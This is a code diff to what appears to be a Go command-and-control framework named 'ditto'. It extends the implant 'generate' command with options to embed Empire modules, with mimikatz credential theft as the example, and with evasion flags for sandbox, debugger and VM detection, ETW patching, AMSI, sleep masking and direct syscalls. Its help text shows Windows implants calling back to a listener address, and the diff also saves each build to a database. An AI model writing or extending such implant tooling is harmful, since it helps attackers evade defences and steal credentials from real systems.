@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"encoding/json"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -12,6 +13,7 @@ import (
 
 	"github.com/ditto/ditto/banner"
 	"github.com/ditto/ditto/core"
+	"github.com/ditto/ditto/database"
 	"github.com/ditto/ditto/jobs"
 	"github.com/ditto/ditto/payload"
 	"github.com/ditto/ditto/transport"
@@ -262,11 +264,16 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 		fmt.Println("      --protocol, -p <proto>   Protocol: http, https, mtls (default: http)")
 		fmt.Println("      --no-encrypt            Disable encryption")
 		fmt.Println("      --no-obfuscate          Disable obfuscation")
+		fmt.Println("      --modules, -m <ids>      Comma-separated Empire module IDs to embed")
+		fmt.Println("      --evasion <options>      Evasion features (comma-separated)")
+		fmt.Println("                               Options: sandbox,debugger,vm,etw,amsi,sleepmask,syscalls")
 		fmt.Println("")
 		fmt.Println("    Examples:")
 		fmt.Println("      generate full windows amd64 --callback http://192.168.1.100:8443")
 		fmt.Println("      generate stager windows amd64 -o /tmp/implant.exe -c https://example.com:443")
 		fmt.Println("      generate full windows amd64 --callback 192.168.1.100:8443 --delay 60 --jitter 0.3")
+		fmt.Println("      generate full windows amd64 -c http://192.168.1.100:8443 --modules powershell/credentials/mimikatz")
+		fmt.Println("      generate full windows amd64 -c http://192.168.1.100:8443 --evasion sandbox,debugger,vm")
 		return nil
 	}
 
@@ -281,6 +288,8 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 	var jitter float64
 	var userAgent string
 	var protocol string
+	var modulesStr string
+	var evasionStr string
 	encrypt := true
 	obfuscate := true
 	
@@ -316,10 +325,55 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 				protocol = args[i+1]
 				i++
 			}
+		case "--modules", "-m":
+			if i+1 < len(args) {
+				modulesStr = args[i+1]
+				i++
+			}
+		case "--evasion":
+			if i+1 < len(args) {
+				evasionStr = args[i+1]
+				i++
+			}
 		case "--no-encrypt":
 			encrypt = false
 		case "--no-obfuscate":
 			obfuscate = false
+		}
+	}
+	
+	// Parse modules
+	var modules []string
+	if modulesStr != "" {
+		modules = strings.Split(modulesStr, ",")
+		// Trim whitespace
+		for i, m := range modules {
+			modules[i] = strings.TrimSpace(m)
+		}
+	}
+	
+	// Parse evasion options
+	var evasion *payload.EvasionConfig
+	if evasionStr != "" {
+		evasion = &payload.EvasionConfig{}
+		evasionOptions := strings.Split(evasionStr, ",")
+		for _, opt := range evasionOptions {
+			switch strings.TrimSpace(strings.ToLower(opt)) {
+			case "sandbox":
+				evasion.EnableSandboxDetection = true
+			case "debugger":
+				evasion.EnableDebuggerCheck = true
+			case "vm":
+				evasion.EnableVMDetection = true
+			case "etw":
+				evasion.EnableETWPatches = true
+			case "amsi":
+				evasion.EnableAMSI = true
+			case "sleepmask":
+				evasion.SleepMask = true
+			case "syscalls":
+				evasion.DirectSyscalls = true
+			}
 		}
 	}
 	
@@ -361,6 +415,8 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 		Jitter:      jitter,
 		UserAgent:   userAgent,
 		Protocol:    protocol,
+		Modules:     modules,
+		Evasion:     evasion,
 	}
 
 	gen := payload.NewGenerator(is.logger)
@@ -377,6 +433,31 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 
 	if err := os.WriteFile(outputPath, data, 0755); err != nil {
 		return fmt.Errorf("failed to write payload: %w", err)
+	}
+
+	// Save build to database
+	modulesJSON, _ := json.Marshal(options.Modules)
+	evasionJSON, _ := json.Marshal(options.Evasion)
+	
+	build := &database.ImplantBuild{
+		Name:        filepath.Base(outputPath),
+		Type:        payloadType,
+		OS:          osTarget,
+		Arch:        arch,
+		CallbackURL: callbackURL,
+		Delay:       delay,
+		Jitter:      jitter,
+		UserAgent:   userAgent,
+		Protocol:    protocol,
+		OutputPath:  outputPath,
+		Size:        int64(len(data)),
+		Modules:     string(modulesJSON),
+		Evasion:     string(evasionJSON),
+	}
+	
+	if err := database.SaveImplantBuild(build); err != nil {
+		is.logger.Error("Failed to save build to database: %v", err)
+		// Continue anyway - build succeeded
 	}
 
 	fmt.Printf("[+] Payload generated successfully!\n")
